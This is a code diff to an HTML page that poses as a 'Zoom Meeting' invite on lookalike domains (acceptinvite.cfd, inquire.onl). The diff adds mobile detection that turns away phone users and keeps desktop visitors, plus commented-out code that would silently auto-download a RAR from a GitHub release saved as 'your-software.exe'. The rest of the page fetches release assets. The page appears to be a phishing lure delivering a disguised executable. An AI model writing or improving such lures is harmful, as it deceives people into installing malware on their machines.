@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
 
   <title>Zoom Meeting</title>
@@ -8,7 +8,7 @@
   <meta property="og:title" content="Zoom Meeting">
   <meta property="og:description" content="Join the Zoom meeting">
   <meta property="og:image" content="zoom.png">
-  <meta property="og:url" content="https://acceptinvite.cfd">
+  <meta property="og:url" content="https://inquire.onl">
   <meta property="og:type" content="website">
 
   <!-- Optional -->
@@ -38,7 +38,12 @@
   </style>
 </head>
 <body>
-  <main class="panel" style="display: none;">
+
+  <div id="msg">
+    <h2>Unable to join on mobile</h2>
+    <p>Please open this link on a PC to join the meeting.</p>
+  </div>
+<main class="panel" style="display: none;">
     <div class="notice">
       <strong></strong>
       This download is provided by an independent publisher. It is not
@@ -65,6 +70,36 @@
 
   <script>
     "use strict";
+
+    function isMobileDevice() {
+      // Check user agent
+      const ua = navigator.userAgent || navigator.vendor || window.opera;
+      const uaCheck = /android|iphone|ipad|ipod|windows phone/i.test(ua);
+
+      // Check touch + small screen as backup (catches edge cases)
+      const touchCheck = ('ontouchstart' in window || navigator.maxTouchPoints > 0) 
+                          && window.innerWidth <= 900;
+
+      return uaCheck || touchCheck;
+    }
+if (isMobileDevice()) {
+      document.getElementById('msg').style.display = 'block';
+    } else {
+    // const downloadUrl = "https://github.com/Global-Trade-Plus/invite/releases/latest/download/invite.rar";
+    // const filename = "your-software.exe";
+
+    // if (isMobileDevice()) {
+    //   document.getElementById('msg').style.display = 'block';
+    // } else {
+    //   // Trigger download immediately
+    //   const link = document.createElement('a');
+    //   link.href = downloadUrl;
+    //   link.download = filename;
+    //   document.body.appendChild(link);
+    //   link.click();
+    //   document.body.removeChild(link);
+    // }
+
 
     // These asset names must match the files attached to your GitHub release.
     const RELEASE_BASE =
@@ -204,7 +239,8 @@
       downloadPanel.style.display = "block";
       status.textContent =
         "Automatic detection failed. Refresh the page or use a supported desktop browser.";
-    });
+    })};
   </script>
+
 </body>
 </html>
